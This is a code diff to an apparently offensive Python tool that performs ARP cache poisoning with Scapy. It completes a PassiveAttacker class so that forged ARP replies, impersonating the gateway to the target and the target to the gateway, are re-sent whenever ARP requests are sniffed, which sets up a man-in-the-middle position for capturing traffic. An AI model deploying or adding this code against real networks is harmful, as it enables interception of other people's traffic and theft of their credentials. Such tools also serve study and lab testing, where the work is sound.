@@ -180,21 +180,22 @@ class PassiveAttacker:
     def poison(self, arper: Arper):
         # Same as above
         signal.signal(signal.SIGINT, signal.SIG_DFL)
+        self.target = arper.target
         ether1 = Ether(dst=arper.target_mac)
         arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
-        poison_target = ether1 / arp1
+        self.poison_target = ether1 / arp1
         ether2 = Ether(dst=arper.gateway_mac)
         arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
-        poison_gateway = ether2 / arp2
-        packet = (poison_gateway, poison_target)
+        self.poison_gateway = ether2 / arp2
         bpf_filter = (
             f"(src host {arper.target} or src host {arper.gateway}) "
             f"and arp and arp[6:2] = 1"
         )
-        sniff(filter=bpf_filter, prn=lambda _: sendp(packet), store=0)
+        sniff(filter=bpf_filter, prn=self.spoof, store=0)
 
-    def spoof(packet, poison):
-        pass
+    def spoof(self, packet):
+        pkt = self.poison_target if packet[ARP].psrc == self.target else self.poison_gateway
+        sendp(pkt, iface=self.iface)
 
     def sniff_and_store(self, arper: Arper, poison_process: Process):
         print(f'Sniffing {arper.count} packets')
@@ -242,9 +243,10 @@ class PassiveAttacker:
                 count=5)
 
     def start(self, arper: Arper):
+        self.iface = arper.interface
         print(f"{RED_BOLD}Please ensure that the network card's promiscuous mode has been enabled. {RESET}")
         try:
-            poison_process = Process(target=self.poison)
+            poison_process = Process(target=self.poison, args=[arper])
             arper.sniff_process = Process(target=self.sniff_and_store, args=[arper, poison_process])
             arper.sniff_process.start()
             while not arper.sniff_process.is_alive():
@@ -268,11 +270,12 @@ class NoInterrupt:
     ensuring crucial operations proceed smoothly
     """
     def __enter__(self):
+        self.original = signal.getsignal(signal.SIGINT)
         signal.signal(signal.SIGINT, signal.SIG_IGN)
         return self
 
     def __exit__(self, exc_type, exc_val, exc_tb):
-        signal.signal(signal.SIGINT, signal.SIG_DFL)
+        signal.signal(signal.SIGINT, self.original)
 
 class Forward:
     def __enter__(self):
